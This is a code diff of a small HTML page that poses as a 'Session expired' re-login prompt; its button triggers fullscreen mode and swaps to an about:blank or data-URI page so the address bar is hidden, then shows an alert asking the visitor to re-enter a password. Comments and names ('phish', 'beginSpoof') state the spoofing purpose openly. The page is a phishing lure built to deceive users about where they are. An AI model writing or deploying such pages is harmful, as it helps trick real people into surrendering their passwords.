@@ -1,42 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login Required</title>
+  <title>Session Expired</title>
   <style>
     html, body {
-      margin: 0; padding: 0;
-      background: white;
+      margin: 0;
+      padding: 0;
       font-family: sans-serif;
-    }
-    .phish {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
+      background: #fff;
       display: flex;
       align-items: center;
       justify-content: center;
+      height: 100vh;
       flex-direction: column;
     }
     button {
-      padding: 15px 30px;
       font-size: 16px;
+      padding: 12px 24px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
 
-<div class="phish">
-  <h2>Session expired. Please login again to continue.</h2>
-  <button onclick="startSpoof()">Re-login</button>
-</div>
+<h2>Your session has expired. Please log in again.</h2>
+<button onclick="beginSpoof()">Re-Login</button>
 
 <script>
-function startSpoof() {
+function beginSpoof() {
   document.documentElement.requestFullscreen().then(() => {
-    location.replace("about:blank"); // spoof page w/o address bar
-    setTimeout(() => {
-      alert("🔒 Please re-enter your password to continue.");
-    }, 1000);
+    // Transition ke halaman spoof (data URI = tanpa address bar)
+    const spoofHTML = encodeURIComponent(`
+      <!DOCTYPE html>
+      <html>
+      <body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif">
+        <script>
+          setTimeout(() => {
+            alert("🔐 Please re-enter your password to continue.");
+          }, 1000);
+        <\/script>
+      </body>
+      </html>
+    `);
+    location.replace("data:text/html," + spoofHTML);
   });
 }
 </script>
